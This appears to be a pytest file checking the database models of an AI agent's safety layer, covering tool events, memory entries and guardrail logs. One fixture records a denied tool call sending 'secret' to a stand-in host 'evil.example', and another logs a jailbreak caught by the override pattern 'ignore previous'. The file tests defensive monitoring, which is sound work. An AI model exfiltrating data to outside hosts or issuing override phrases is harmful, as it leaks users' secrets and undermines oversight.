"""Tool events, memory entries, and FK integrity."""

from __future__ import annotations

import uuid

import pytest
from sqlalchemy import select
from sqlalchemy.exc import IntegrityError
from sqlalchemy.orm import Session

from manifold_agent.db.models import (
    Asker,
    GuardrailEvent,
    MemoryEntryRow,
    SessionRow,
    ToolEvent,
)

pytestmark = pytest.mark.db


def test_tool_event_round_trip(db: Session, asker: Asker, session_row: SessionRow) -> None:
    event = ToolEvent(
        session_id=session_row.id,
        asker_id=asker.id,
        tool_name="send_external",
        kind="SendExternal",
        arguments={"to": "evil.example", "body": "secret"},
        payload_bytes=128,
        recipients=1,
        argument_tainted=True,
        off_transcript=False,
        source_sensitivity=0.9,
        decision="deny",
        margin_before=10.0,
        margin_after=10.0,
        required=50.0,
        alpha_effective=0.05,
        orbit_residual=0.0,
        budget_fraction=0.1,
        admissible_fraction=0.0,
        blocked_by_coalition=None,
        z_before=[0, 0, 0, 0, 0, 0],
        z_after=[0, 0, 0, 0, 0, 0],
        result=None,
    )
    db.add(event)
    db.flush()

    loaded = db.scalar(select(ToolEvent).where(ToolEvent.id == event.id))
    assert loaded is not None
    assert loaded.decision == "deny"
    assert loaded.kind == "SendExternal"
    assert loaded.arguments["to"] == "evil.example"
    assert loaded.session.thread_id == session_row.thread_id


def test_tool_event_kind_check(db: Session, asker: Asker, session_row: SessionRow) -> None:
    db.add(
        ToolEvent(
            session_id=session_row.id,
            asker_id=asker.id,
            tool_name="x",
            kind="NotAKind",
            decision="admit",
        )
    )
    with pytest.raises(IntegrityError):
        db.flush()


def test_memory_entry_embedding_and_fk(
    db: Session, asker: Asker, session_row: SessionRow
) -> None:
    emb = [0.0] * 384
    emb[0] = 1.0
    row = MemoryEntryRow(
        asker_id=asker.id,
        session_id=session_row.id,
        kind="fact",
        content="the vault is locked",
        importance=0.8,
        scope="session",
        embedding=emb,
        metadata_={"source": "test"},
    )
    db.add(row)
    db.flush()

    loaded = db.scalar(select(MemoryEntryRow).where(MemoryEntryRow.id == row.id))
    assert loaded is not None
    assert loaded.kind == "fact"
    assert len(loaded.embedding) == 384
    assert float(loaded.embedding[0]) == pytest.approx(1.0)
    assert loaded.metadata_["source"] == "test"


def test_memory_embedding_length_check(db: Session, asker: Asker) -> None:
    db.add(
        MemoryEntryRow(
            asker_id=asker.id,
            kind="fact",
            content="short emb",
            embedding=[0.1, 0.2],
        )
    )
    with pytest.raises(IntegrityError):
        db.flush()


def test_guardrail_event_round_trip(db: Session, asker: Asker, session_row: SessionRow) -> None:
    evt = GuardrailEvent(
        session_id=session_row.id,
        asker_id=asker.id,
        stage="input",
        allowed=False,
        risk=0.95,
        reason="jailbreak",
        model=None,
        details={"pattern": "ignore previous"},
    )
    db.add(evt)
    db.flush()
    loaded = db.scalar(select(GuardrailEvent).where(GuardrailEvent.id == evt.id))
    assert loaded is not None
    assert loaded.stage == "input"
    assert loaded.allowed is False


def test_tool_event_requires_valid_session(db: Session, asker: Asker) -> None:
    db.add(
        ToolEvent(
            session_id=uuid.uuid4(),
            asker_id=asker.id,
            tool_name="read_local",
            kind="ReadLocal",
            decision="admit",
        )
    )
    with pytest.raises(IntegrityError):
        db.flush()
